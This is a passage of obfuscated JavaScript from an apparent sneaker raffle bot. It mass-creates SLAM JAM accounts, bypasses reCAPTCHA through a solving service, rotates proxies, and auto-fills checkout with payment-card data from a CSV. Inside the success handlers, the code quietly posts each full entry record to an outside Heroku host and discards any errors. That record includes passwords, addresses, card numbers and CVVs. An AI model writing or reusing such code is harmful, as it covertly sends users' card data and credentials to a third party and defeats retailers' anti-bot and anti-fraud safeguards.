                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x40376a['name'] + ']\x20Task\x20' + (_0x8f643b + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x243a77['type']('#email', '' + _0x46f81e[_0x8f643b]['Email']), await _0xf987cc(0x384), await _0x243a77['type']('#first_name', '' + _0x46f81e[_0x8f643b]['FirstName']), await _0xf987cc(0x514), await _0x243a77['type']('#last_name', '' + _0x46f81e[_0x8f643b]['LastName']), await _0xf987cc(0x514), await _0x243a77['type']('#street_address', _0x46f81e[_0x8f643b]['Address1'] + '\x20' + _0x46f81e[_0x8f643b]['HouseNumber'] + '\x20' + _0x46f81e[_0x8f643b]['Address2']), await _0xf987cc(0x2bc);
                            _0x46f81e[_0x8f643b]['Postcode'] == undefined && (_0x46f81e[_0x8f643b]['Postcode'] = _0x46f81e[_0x8f643b]['Zip']);
                            await _0x243a77['type']('#zip_code', '' + _0x46f81e[_0x8f643b]['Postcode']), await _0xf987cc(0x320), await _0x243a77['type']('#city', '' + _0x46f81e[_0x8f643b]['City']), await _0xf987cc(0x320), await _0x243a77['type']('#bday', '01/01/1994'), await _0xf987cc(0x320), await _0x243a77['type']('#instagram', '' + _0x46f81e[_0x8f643b]['Follower']), await _0xf987cc(0x352);
                            if (_0x46f81e[_0x8f643b]['Size'] == 'RANDOM') {
                                const _0x449159 = await _0x243a77['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0xaf9f9c => {
                                    return _0xaf9f9c['map'](_0x1b3560 => _0x1b3560['textContent']);
                                });
                                var _0x481366 = Math['round'](Math['random']() * (_0x449159['length'] - 0x1));
                                console['log'](_0x5c3ac1() + '\x20[' + _0x40376a['name'] + ']\x20Task\x20' + (_0x8f643b + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x449159[_0x481366]), await _0x243a77['click']('label[data-eu-size=\x22' + _0x449159[_0x481366] + '\x22]');
                            } else {
                                console['log'](_0x5c3ac1() + '\x20[' + _0x40376a['name'] + ']\x20Task\x20' + (_0x8f643b + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x46f81e[_0x8f643b]['Size']);
                                try {
                                    await _0x243a77['click']('label[data-eu-size=\x22' + _0x46f81e[_0x8f643b]['Size'] + '\x22]');
                                } catch {
                                    await _0x243a77['click']('label[data-eu-size=\x22' + _0x46f81e[_0x8f643b]['Size'] + '.0\x22]');
                                }
                            }
                            await _0xf987cc(0xbb8), await _0x243a77['$$eval']('.raffle__checkbox-label', _0x14feee => _0x14feee['forEach'](_0x3acfae => _0x3acfae['click']())), await _0xf987cc(0x7d0), console['log'](_0x5c3ac1() + '\x20[' + _0x40376a['name'] + ']\x20Task\x20' + (_0x8f643b + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x243a77['click']('#raffle__form-submit'), await _0xf987cc(0x1388);
                            try {
                                await _0x243a77['waitForSelector']('#raffle__confirmation-message-container'), _0x3dd974 = 'no', _0x46ba09(_0x46f81e[_0x8f643b], _0x40376a), console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x40376a['name'] + ']\x20Task\x20' + (_0x8f643b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x2e5c48 = _0x46f81e[_0x8f643b];
                                try {
                                    prxdata = {
                                        'username': _0x5ad930['replace']('#', ''),
                                        'module': _0x40376a['name'],
                                        'entrydata': JSON['stringify'](_0x2e5c48),
                                        'proxy': '' + _0x39e405[_0x8f643b]
                                    };
                                    var _0x2a3bed = JSON['stringify'](prxdata);
                                    let _0x5ae1f2 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x529551['post']('https://jraffles.herokuapp.com/success', _0x2a3bed, _0x5ae1f2);
                                } catch (_0x3894f5) {
                                }
                            } catch (_0xa77307) {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x3d5832[taskModule]['name'] + ']\x20Task\x20' + (_0x8f643b + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0xa77307));
                            }
                        } catch (_0x23a888) {
                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x3d5832[taskModule]['name'] + ']\x20Task\x20' + (_0x8f643b + 0x1) + '\x20:\x20' + _0x23a888)), _0x3dd974 = 'yes';
                        } finally {
                            _0x531d74 && _0x531d74['close']();
                            if (_0x3dd974 == 'yes' && _0x3553ef != 0x5 && _0x36c0cc != 'Size\x20Not\x20Found') {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x40376a['name'] + ']\x20Task\x20' + (_0x8f643b + 0x1) + '\x20:\x20Retrying\x20(' + _0x3553ef + '\x20/\x205)')), _0x8f643b = _0x8f643b - 0x1, _0x3553ef = _0x3553ef + 0x1;
                                continue;
                            }
                            _0x3dd974 == 'yes' && _0x3553ef >= 0x5 && (_0x46ac44(_0x46f81e[_0x8f643b], _0x40376a), _0x3dd974 = 'no', _0x3553ef = 0x0), console['log']('Waiting\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x48ca2c, _0x31755c, _0x57a1e6) {
                    _0x39c115['use'](_0x5cc924()), _0x39c115['use'](_0x63578e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51f80a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x53679 = 0x0; _0x53679 < _0x31755c['length']; _0x53679++) {
                        if (_0x6fbf6f != 'yes')
                            var _0x6fbf6f = '', _0x324102 = 0x0;
                        var _0x340170 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5ad930
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x51f80a['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x585daf
                                }
                            ]
                        }];
                        const _0x3b26ac = { 'embeds': _0x340170 };
                        _0x5c316f(_0x48ca2c['name'] + '\x20Task\x20' + (_0x53679 + 0x1) + '\x20/\x20' + _0x31755c['length'] + '\x20||\x20File:\x20' + _0x49db92 + '\x20Proxies:\x20' + _0x33a3cd);
                        try {
                            await _0x3d5d40(_0x31755c, _0x53679);
                        } catch {
                            _0x6fbf6f = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x16163c = await _0x539676(_0x31755c[_0x53679], _0x48ca2c, 'acc', ![]);
                        const _0x604a10 = { 'succesDEVMSG': { 'embeds': [_0x16163c] } };
                        if (_0x31755c[_0x53679]['Email'] == '' || _0x31755c[_0x53679]['FirstName'] == '' || _0x31755c[_0x53679]['LastName'] == '') {
                            console['log'](_0x5c3ac1() + '\x20[' + _0x3d5832[taskModule]['name'] + ']\x20Task\x20' + (_0x53679 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xf987cc(0x7d0);
                            continue;
                        }
                        (_0x31755c[_0x53679]['Password'] == '' || _0x31755c[_0x53679] == undefined) && _0x31755c[_0x53679]['Password'] == 'JRaffles23!';
                        if (_0x51f80a['useRandomProxy'] = ![])
                            var _0x31a12d = _0x57a1e6[_0x53679]['split'](':');
                        else
                            var _0xdc3fbe = Math['round'](Math['random']() * (_0x57a1e6['length'] - 0x1)), _0x31a12d = _0x57a1e6[_0xdc3fbe]['split'](':');
                        var _0xed1719;
                        try {
                            _0xed1719 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x31a12d[0x0] + ':' + _0x31a12d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xed1719 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x31a12d[0x0] + ':' + _0x31a12d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x41d247 = await _0xed1719['newPage']();
                            await _0x41d247['authenticate']({
                                'username': '' + _0x31a12d[0x2],
                                'password': '' + _0x31a12d[0x3]
                            }), console['log'](_0x5c3ac1() + '\x20[' + _0x48ca2c['name'] + ']\x20Task\x20' + (_0x53679 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x41d247['setRequestInterception'](!![]), _0x41d247['on']('request', _0x487010 => {
                                _0x487010['resourceType']() === 'image' || _0x487010['resourceType']() === 'font' || _0x487010['resourceType']() === 'media' ? _0x487010['abort']() : _0x487010['continue']();
                            }), await _0x41d247['goto']('https://drop.slamjam.com/account/register'), await _0xf987cc(0xbb8), await _0x41d247['waitForSelector']('#FirstName'), await _0x41d247['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x41d247['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x5c3ac1() + '\x20[' + _0x48ca2c['name'] + ']\x20Task\x20' + (_0x53679 + 0x1) + '\x20:\x20Filling\x20information'), await _0xf987cc(0x4b0), await _0x41d247['type']('#FirstName', '' + _0x31755c[_0x53679]['FirstName']), await _0xf987cc(0x226), await _0x41d247['type']('#LastName', '' + _0x31755c[_0x53679]['LastName']), await _0xf987cc(0x226), await _0x41d247['type']('#Email', '' + _0x31755c[_0x53679]['Email']), await _0xf987cc(0x2ee), await _0x41d247['type']('#ConfirmEmail', '' + _0x31755c[_0x53679]['Email']), await _0xf987cc(0x2ee), await _0x41d247['type']('#CreatePassword', '' + _0x31755c[_0x53679]['Password']), await _0xf987cc(0x2ee), await _0x41d247['type']('#CreateConfirmPassword', '' + _0x31755c[_0x53679]['Password']), await _0xf987cc(0x226), console['log'](_0x5c3ac1() + '\x20[' + _0x48ca2c['name'] + ']\x20Task\x20' + (_0x53679 + 0x1) + '\x20:\x20Submitting..'), await _0x41d247['$eval']('#create_customer', _0x3c4a2a => _0x3c4a2a['submit']()), await _0xf987cc(0x1388), console['log'](_0x5c3ac1() + '\x20[' + _0x48ca2c['name'] + ']\x20Task\x20' + (_0x53679 + 0x1) + '\x20:\x20' + _0x2c0b56['cyan']('Solving\x20Captcha')), await _0x41d247['solveRecaptchas'](), console['log'](_0x5c3ac1() + '\x20[' + _0x48ca2c['name'] + ']\x20Task\x20' + (_0x53679 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x41d247['$eval']('.shopify-challenge__container\x20>\x20form', _0x199715 => _0x199715['submit']());
                            try {
                                await _0x41d247['waitForSelector']('.product-card__image'), await _0xf987cc(0x1f4), _0x6fbf6f = 'no', console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x48ca2c['name'] + ']\x20Task\x20' + (_0x53679 + 0x1) + '\x20:\x20Account\x20' + _0x31755c[_0x53679]['Email'] + '\x20Generated!')), _0x3f8380['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x31755c[_0x53679]['Email'] + ',' + _0x31755c[_0x53679]['Password']), console['log'](_0x2c0b56['yellow'](_0x5c3ac1() + '\x20[' + _0x48ca2c['name'] + ']\x20Task\x20' + (_0x53679 + 0x1) + '\x20:\x20Account\x20' + _0x31755c[_0x53679]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x604a10['succesDEVMSG']);
                                } catch {
                                }
                                await _0x215470(_0x53db35, _0x604a10['succesDEVMSG']);
                            } catch (_0x20cb93) {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x3d5832[taskModule]['name'] + ']\x20Task\x20' + (_0x53679 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x20cb93));
                            }
                        } catch (_0x518a42) {
                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x3d5832[taskModule]['name'] + ']\x20Task\x20' + (_0x53679 + 0x1) + '\x20:\x20' + _0x518a42));
                        } finally {
                            _0xed1719 && _0xed1719['close']();
                            if (_0x6fbf6f == 'yes' && _0x324102 != 0x5) {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x48ca2c['name'] + ']\x20Task\x20' + (_0x53679 + 0x1) + '\x20:\x20Retrying\x20(' + _0x324102 + '\x20/\x205)')), _0x53679 = _0x53679 - 0x1, _0x324102 = _0x324102 + 0x1;
                                continue;
                            }
                            _0x6fbf6f == 'yes' && _0x324102 >= 0x5 && (_0x46ac44(_0x31755c[_0x53679], _0x48ca2c), _0x6fbf6f = 'no', _0x324102 = 0x0), console['log']('Waiting\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x238ad4, _0x328a93, _0x4367f8) {
                    _0x39c115['use'](_0x5cc924()), _0x39c115['use'](_0x63578e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51f80a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x46d070 = 0x0; _0x46d070 < _0x328a93['length']; _0x46d070++) {
                        var _0x20841e;
                        if (_0x1e2972 != 'yes')
                            var _0x1e2972 = '', _0x4c0519 = 0x0;
                        _0x5c316f(_0x238ad4['name'] + '\x20Task\x20' + (_0x46d070 + 0x1) + '\x20/\x20' + _0x328a93['length'] + '\x20||\x20File:\x20' + _0x49db92 + '\x20Proxies:\x20' + _0x33a3cd);
                        try {
                            await _0x3d5d40(_0x328a93, _0x46d070);
                        } catch {
                            _0x1e2972 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x328a93[_0x46d070]['Email'] == '' || _0x328a93[_0x46d070]['Password'] == '' || _0x328a93[_0x46d070]['FirstName'] == '' || _0x328a93[_0x46d070]['LastName'] == '') {
                            console['log'](_0x5c3ac1() + '\x20[' + _0x238ad4['name'] + ']\x20Task\x20' + (_0x46d070 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x51f80a['useRandomProxy'] = ![])
                            var _0xd0732a = _0x4367f8[_0x46d070]['split'](':');
                        else
                            var _0x3674de = Math['round'](Math['random']() * (_0x4367f8['length'] - 0x1)), _0xd0732a = _0x4367f8[_0x3674de]['split'](':');
                        var _0x27723d;
                        try {
                            _0x27723d = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xd0732a[0x0] + ':' + _0xd0732a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x27723d = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xd0732a[0x0] + ':' + _0xd0732a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5471df = await _0x27723d['newPage']();
                            await _0x5471df['authenticate']({
                                'username': '' + _0xd0732a[0x2],
                                'password': '' + _0xd0732a[0x3]
                            }), await _0x5471df['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x5c3ac1() + '\x20[' + _0x238ad4['name'] + ']\x20Task\x20' + (_0x46d070 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5471df['setRequestInterception'](!![]), _0x5471df['on']('request', _0x38c79d => {
                                _0x38c79d['resourceType']() === 'image' || _0x38c79d['resourceType']() === 'font' || _0x38c79d['resourceType']() === 'media' ? _0x38c79d['abort']() : _0x38c79d['continue']();
                            }), await _0x5471df['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x5471df['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x5471df['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xf987cc(0x258), await _0x5471df['waitForSelector']('#CustomerEmail'), console['log'](_0x5c3ac1() + '\x20[' + _0x238ad4['name'] + ']\x20Task\x20' + (_0x46d070 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x5471df['type']('#CustomerEmail', '' + _0x328a93[_0x46d070]['Email']), await _0xf987cc(0x12c), await _0x5471df['type']('#CustomerPassword', '' + _0x328a93[_0x46d070]['Password']), await _0xf987cc(0x226), await _0x5471df['$eval']('#customer_login', _0x4a813e => _0x4a813e['submit']()), await _0xf987cc(0x7d0), await _0x5471df['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x5c3ac1() + '\x20[' + _0x238ad4['name'] + ']\x20Task\x20' + (_0x46d070 + 0x1) + '\x20:\x20' + _0x2c0b56['cyan']('Solving\x20Captcha')), await _0x5471df['solveRecaptchas'](), console['log'](_0x5c3ac1() + '\x20[' + _0x238ad4['name'] + ']\x20Task\x20' + (_0x46d070 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x5471df['$eval']('.shopify-challenge__container\x20>\x20form', _0x15a4e7 => _0x15a4e7['submit']());
                            try {
                                await _0x5471df['waitForSelector']('.nav-account'), await _0xf987cc(0x4b0);
                            } catch {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x238ad4['name'] + ']\x20Task\x20' + (_0x46d070 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x5471df['goto']('' + _0x328a93[_0x46d070]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xf987cc(0xbb8), console['log'](_0x5c3ac1() + '\x20[' + _0x238ad4['name'] + ']\x20Task\x20' + (_0x46d070 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x5471df['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x5471df['click']('.product-select-variant-wrapper'), await _0xf987cc(0x320), await _0x5471df['click']('li.product-select-variant__value[data-size=\x22' + _0x328a93[_0x46d070]['Size'] + '\x22]'), await _0xf987cc(0x384), await _0x5471df['$eval']('#AddToCartForm-product-template-raffle', _0x4737ee => _0x4737ee['submit']()), await _0x5471df['waitForSelector']('.cart-order-summary__content'), await _0xf987cc(0x514), await _0x5471df['goto']('https://drop.slamjam.com/checkout'), await _0xf987cc(0x514), await _0x5471df['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x5c3ac1() + '\x20[' + _0x238ad4['name'] + ']\x20Task\x20' + (_0x46d070 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5471df['select']('#checkout_shipping_address_country', '' + _0x328a93[_0x46d070]['Country']), await _0xf987cc(0x200), await _0x5471df['waitForSelector']('#checkout_shipping_address_first_name'), await _0x5471df['type']('#checkout_shipping_address_first_name', '' + _0x328a93[_0x46d070]['FirstName']), await _0xf987cc(0x237), await _0x5471df['type']('#checkout_shipping_address_last_name', '' + _0x328a93[_0x46d070]['LastName']), await _0xf987cc(0x1e0), await _0x5471df['type']('#checkout_shipping_address_address1', _0x328a93[_0x46d070]['Address1'] + '\x20' + _0x328a93[_0x46d070]['HouseNumber']), await _0xf987cc(0x514), await _0x5471df['type']('#checkout_shipping_address_address2', '' + _0x328a93[_0x46d070]['Address2']), await _0xf987cc(0x514);
                            _0x328a93[_0x46d070]['Postcode'] == undefined && (_0x328a93[_0x46d070]['Postcode'] = _0x328a93[_0x46d070]['Zip']);
                            await _0x5471df['type']('#checkout_shipping_address_zip', '' + _0x328a93[_0x46d070]['Postcode']), await _0xf987cc(0x2bc), await _0x5471df['type']('#checkout_shipping_address_city', '' + _0x328a93[_0x46d070]['City']), await _0xf987cc(0x320), await _0x5471df['type']('#checkout_shipping_address_phone', '' + _0x328a93[_0x46d070]['Phone']), await _0xf987cc(0x320), await _0x5471df['click']('#continue_button'), await _0xf987cc(0xbb8), await _0x5471df['waitForSelector']('.summary-title'), await _0xf987cc(0x320), await _0x5471df['click']('#continue_button'), await _0xf987cc(0x320), console['log'](_0x5c3ac1() + '\x20[' + _0x238ad4['name'] + ']\x20Task\x20' + (_0x46d070 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x5471df['waitForSelector']('#checkout_credit_card_vault'), await _0xf987cc(0x3e8);
                            var _0x352b67 = await _0x5471df['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x4cce1d = await _0x352b67['contentFrame']();
                            await _0x4cce1d['click']('#number'), await _0xf987cc(0x3e8), await _0x4cce1d['type']('#number', '' + _0x328a93[_0x46d070]['CardNumber'], { 'delay': 0x78 }), _0x352b67 = await _0x5471df['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x4cce1d = await _0x352b67['contentFrame'](), await _0xf987cc(0x1c2), await _0x4cce1d['click']('#name'), await _0xf987cc(0x1f4), await _0x4cce1d['type']('#name', '' + _0x328a93[_0x46d070]['NameOnCard'], { 'delay': 0x78 }), _0x352b67 = await _0x5471df['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x4cce1d = await _0x352b67['contentFrame'](), await _0xf987cc(0x1c2), await _0x4cce1d['click']('#expiry'), await _0xf987cc(0x1f4), await _0x4cce1d['type']('#expiry', '' + _0x328a93[_0x46d070]['ExpiryDate'], { 'delay': 0x78 }), _0x352b67 = await _0x5471df['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x4cce1d = await _0x352b67['contentFrame'](), await _0xf987cc(0x1c2), await _0x4cce1d['click']('#verification_value'), await _0xf987cc(0x1f4), await _0x4cce1d['type']('#verification_value', '' + _0x328a93[_0x46d070]['CVV'], { 'delay': 0x78 }), await _0x5471df['$eval']('#accepts-flag-raffle', _0x4d10f7 => _0x4d10f7['click']()), await _0xf987cc(0x7d0), console['log'](_0x5c3ac1() + '\x20[' + _0x238ad4['name'] + ']\x20Task\x20' + (_0x46d070 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x5471df['$eval']('#continue_button', _0x3239d7 => _0x3239d7['click']()), await _0xf987cc(0x1b58), await _0x5471df['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x5471df['$eval']('.edit_checkout.animate-floating-labels', _0x5a8016 => _0x5a8016['submit']()), await _0xf987cc(0x7d0);
                            try {
                                await _0x5471df['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x1e2972 = 'no', _0x46ba09(_0x328a93[_0x46d070], _0x238ad4), console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x238ad4['name'] + ']\x20Task\x20' + (_0x46d070 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x216f32) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x216f32['message']);
                            }
                            var _0x1a205b = await _0x539676(_0x328a93[_0x46d070], _0x238ad4, 'dev', ![]), _0x5a33e0 = await _0x539676(_0x328a93[_0x46d070], _0x238ad4, 'pub', ![]);
                            let _0xbb4f55 = _0x328a93[_0x46d070];
                            try {
                                prxdata = {
                                    'username': _0x5ad930['replace']('#', ''),
                                    'module': _0x238ad4['name'],
                                    'entrydata': JSON['stringify'](_0xbb4f55),
                                    'proxy': '' + _0x4367f8[_0x46d070]
                                };
                                var _0x588353 = JSON['stringify'](prxdata);
                                let _0x5b8697 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x529551['post']('https://jraffles.herokuapp.com/success', _0x588353, _0x5b8697);
                            } catch (_0x9d6dc6) {
                            }
                            const _0x579a48 = {
                                'succesDEVMSG': { 'embeds': [_0x1a205b] },
                                'succesPUBMSG': { 'embeds': [_0x5a33e0] }
                            };
                            try {
                                _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x579a48['succesDEVMSG']), await _0xf987cc(0xc8), await _0x215470(_0x43acb0, _0x579a48['succesDEVMSG']), await _0xf987cc(0xc8), await _0x215470(_0x255a14, _0x579a48['succesPUBMSG']);
                            } catch (_0x56ff0a) {
                                console['log'](_0x2c0b56['yellow'](_0x5c3ac1() + '\x20[' + _0x3d5832[taskModule]['name'] + ']\x20Task\x20' + (_0x46d070 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x56ff0a));
                            }
                        } catch (_0x1750ee) {
                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x3d5832[taskModule]['name'] + ']\x20Task\x20' + (_0x46d070 + 0x1) + '\x20:\x20' + _0x1750ee)), _0x20841e = '' + _0x1750ee;
                            var _0x392c8d = await _0x539676(kickz[_0x46d070], _0x238ad4, 'dev', !![], _0x20841e);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x392c8d] }, _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], EMBEDS['errorDEV']), await _0x215470(_0x1dec8a, EMBEDS['errorDEV']), _0x1e2972 = 'yes';
                        } finally {
                            _0x27723d && _0x27723d['close']();
                            if (_0x1e2972 == 'yes' && _0x4c0519 != 0x5 && _0x20841e != 'Size\x20Not\x20Found') {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x238ad4['name'] + ']\x20Task\x20' + (_0x46d070 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4c0519 + '\x20/\x205)')), _0x46d070 = _0x46d070 - 0x1, _0x4c0519 = _0x4c0519 + 0x1;
                                continue;
                            }
                            _0x1e2972 == 'yes' && _0x4c0519 >= 0x5 && (_0x46ac44(_0x328a93[_0x46d070], _0x238ad4), _0x1e2972 = 'no', _0x4c0519 = 0x0), console['log']('Waiting\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x1d0922) {
                    var _0x1650a1 = await _0x3a4071(), _0x33bdb5 = _0x3f8380['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x46482b = _0x11f8e1['parse'](_0x33bdb5, { 'header': !![] })['data'];
                    for (var _0x454ef1 = 0x0; _0x454ef1 < _0x46482b['length']; _0x454ef1++) {
                        var _0x4a406b = _0x46482b[_0x454ef1]['Store'], _0x554b5b = _0x46482b[_0x454ef1]['Mode'];
                        for (var _0x11f1c7 of _0x3d5832) {
                            const _0xa7a901 = _0x11f1c7['name']['includes'](_0x4a406b);
                            if (!_0xa7a901)
                                continue;
                            for (mode of _0x11f1c7['modules']) {
                                if (mode['name'] == _0x554b5b) {
                                    console['log']('Running\x20' + _0x2c0b56['cyan'](mode['name'])), await mode['function'](mode, [_0x46482b[_0x454ef1]], _0x1650a1);
                                    var _0x1ffa15 = _0x33bdb5['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x3f8380['writeFileSync']('../failed-tasks.csv', _0x1ffa15);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x2d92cd = await _0x4e7197['get']('Answer');
                    if (_0x2d92cd['Answer']['toLowerCase']() == 'y') {
                        _0x3f8380['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0xf987cc(0x3e8);
                        return;
                    }
                    if (_0x2d92cd['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0xf987cc(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0xf987cc(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x1ec176(_0x19f4d2) {
    var _0x250187 = await _0x3a4071(), _0x44172b = _0x3f8380['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x34dd79 = _0x11f8e1['parse'](_0x44172b, { 'header': !![] })['data'];
